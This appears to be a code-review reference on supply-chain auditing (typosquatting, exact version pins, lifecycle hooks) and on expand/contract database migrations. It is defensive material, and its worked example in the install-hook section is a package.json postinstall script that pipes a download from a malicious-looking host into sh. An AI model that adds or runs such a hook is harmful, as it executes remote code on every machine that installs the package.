# Supply Chain & Database Migration Safety — Reference

This reference documents 2027 Adversarial Code Review standards for third-party supply chain verification (OWASP ASI04 / ASI05) and zero-downtime database migration safety (Expand / Contract pattern).

---

## 1. Supply Chain Security Audit (OWASP ASI04 / ASI05)

Autonomous AI agents and automated PRs frequently introduce or update dependencies without human scrutiny, creating critical vectors for dependency confusion, typosquatting, and malicious lifecycle hooks.

### 1.1 Typosquatting & Package Name Verification
- **Orthographic & Phonetic Similarity**: Audit package additions for subtle edits mimicking trusted packages (e.g. `crossenv` vs `cross-env`, `loadash` vs `lodash`, `colorama-v2` vs `colorama`).
- **Namespace Hijacking**: Reject packages published under unclaimed or deceptive scopes (e.g. `@org-internal/pkg` vs `@org_internal/pkg`).
- **Package Age & Reputation**: Review package publish timestamp and weekly downloads. New packages published within days or with <1,000 weekly downloads must be escalated to the Security Lead.

### 1.2 Lockfile & Version Pinning Rules
- **Explicit Immutability**: All dependencies in production manifests (`package.json`, `pyproject.toml`, `Cargo.toml`, `go.mod`) must use exact version pins. Reject wildcards (`*`), loose carats (`^`), or unbounded tildes (`~`) in locked environments.
- **Lockfile Atomicity**: Never accept a diff modifying `package.json` without an accompanying, synchronized update to `package-lock.json`.
- **Integrity Checksums**: Verify that `integrity` hashes in lockfiles use SHA-512 (`sha512-...`) rather than deprecated SHA-1 or MD5.

### 1.3 Install Hook & Lifecycle Script Audit
Reviewers must inspect `package.json` for embedded lifecycle scripts:
```json
{
  "scripts": {
    "postinstall": "curl -sSL https://malicious-telemetry.com/collect | sh",
    "preinstall": "node ./scripts/telemetry.js"
  }
}
```
- **Rule**: Block any pull request where a third-party dependency executes arbitrary shell scripts or spawns network requests during installation (`npm install --ignore-scripts` enforcement).

---

## 2. Zero-Downtime Database Migration Safety (Expand / Contract)

In a continuous deployment environment where multiple versions of application code run concurrently (canary releases, rolling updates), schema changes must **never** break running instances.

### 2.1 The Destructive Single-Step Anti-Pattern
Applying a schema migration that renames or drops a column in a single step causes immediate production outages:
```sql
-- ANTI-PATTERN: Will cause 500 errors on all currently running app pods
ALTER TABLE users RENAME COLUMN phone TO mobile_number;
ALTER TABLE users DROP COLUMN legacy_status;
```
Running application pods expecting `phone` will instantly fail upon encountering the altered schema.

---

## 3. The 3-Phase Expand / Contract Lifecycle

```
Phase 1: EXPAND
┌────────────────────────────────┐
│ Add new column as NULLABLE     │
│ Deploy App v1: Dual-Write both │
└──────────────┬─────────────────┘
               │
Phase 2: BACKFILL & SWITCH
┌──────────────▼─────────────────┐
│ Async batch backfill old -> new│
│ Deploy App v2: Read from new   │
└──────────────┬─────────────────┘
               │
Phase 3: CONTRACT
┌──────────────▼─────────────────┐
│ Deprecate old column           │
│ Deploy App v3: Remove old code │
│ Migration: DROP old column     │
└────────────────────────────────┘
```

### 3.1 Phase 1 — Expand (Additive Schema Migration)
1. Add the new column as `NULLABLE` (or with a safe default that does not require a table rewrite lock):
   ```sql
   ALTER TABLE users ADD COLUMN mobile_number VARCHAR(32) DEFAULT NULL;
   ```
2. Deploy application code that **writes to both** `phone` and `mobile_number`, but continues reading from `phone`.

### 3.2 Phase 2 — Backfill & Read Switch
1. Execute an asynchronous, rate-limited backfill job using keyset pagination:
   ```sql
   UPDATE users
   SET mobile_number = phone
   WHERE id > :last_seen_id AND mobile_number IS NULL
   ORDER BY id ASC
   LIMIT 1000;
   ```
2. Verify backfill completion and zero data drift.
3. Deploy application code that reads from `mobile_number` and dual-writes to both columns.

### 3.3 Phase 3 — Contract (Cleanup)
1. Deploy application code that removes all references to the legacy `phone` column (stop writing).
2. Execute the final cleanup migration:
   ```sql
   ALTER TABLE users DROP COLUMN phone;
   ```

### 3.4 Migration Review Checklist
- [ ] Are new columns added as nullable or with default values that do not lock the table?
- [ ] Are index creations performed concurrently (`CREATE INDEX CONCURRENTLY`) to prevent blocking table writes?
- [ ] Does the migration avoid foreign key constraint validation locks on multi-million row tables?
- [ ] Is there an explicit rollback plan for every phase?
